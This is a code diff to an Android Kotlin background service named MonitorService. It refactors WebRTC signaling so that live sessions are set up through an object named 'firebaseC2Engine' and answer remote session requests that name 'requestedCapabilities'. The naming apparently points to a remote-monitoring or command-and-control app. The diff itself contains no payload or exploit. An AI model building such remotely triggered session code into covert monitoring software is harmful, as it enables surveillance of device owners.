@@ -392,23 +392,20 @@ class MonitorService : LifecycleService() {
                 ).apply { startEngine() }
 
                 val fbEngine = firebaseC2Engine ?: return@launch
+                val signalingCoordinator = SignalingCoordinator(this@MonitorService, fbEngine)
+                webRtcEngine = WebRtcEngine(this@MonitorService, signalingCoordinator)
+
                 signalingRepository = FirebaseSignalingRepository(this@MonitorService, fbEngine).apply {
                     setCallback(object : FirebaseSignalingRepository.SignalingCallback {
                         override fun onSessionRequested(sessionId: String, requestedCapabilities: List<String>) {
-                            webRtcEngine = WebRtcEngine(this@MonitorService, this@apply).apply {
-                                startSession(sessionId, isOffer = false)
-                            }
+                            webRtcEngine?.startAnswererSession(sessionId)
                         }
 
-                        override fun onOfferReceived(sdp: String) {
+                        override fun onOfferReceived(sessionId: String, sdp: String) {
                             webRtcEngine?.handleRemoteOffer(sdp)
                         }
 
-                        override fun onAnswerReceived(sdp: String) {
-                            webRtcEngine?.handleRemoteAnswer(sdp)
-                        }
-
-                        override fun onIceCandidateReceived(candidateJson: JSONObject) {
+                        override fun onIceCandidateReceived(sessionId: String, candidateJson: JSONObject) {
                             webRtcEngine?.addRemoteIceCandidate(candidateJson)
                         }
 
